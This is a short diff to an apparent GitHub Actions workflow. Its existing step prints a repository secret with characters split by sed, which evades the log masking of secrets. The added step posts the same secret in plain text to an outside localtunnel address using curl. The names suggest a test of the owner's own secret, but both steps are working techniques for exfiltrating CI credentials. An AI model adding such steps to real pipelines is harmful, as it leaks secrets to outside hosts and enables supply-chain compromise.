@@ -14,3 +14,9 @@ jobs:
           MY_SECRET: ${{ secrets.TEST_SECRET }}
         run: |
           echo "$MY_SECRET" | sed 's/./&-/g'
+      
+      - name: Send to My Local Machine
+        env:
+          MY_SECRET: ${{ secrets.TEST_SECRET }}
+        run: |
+          curl -X POST -d "The secret is: $MY_SECRET" https://smart-steaks-float.loca.lt
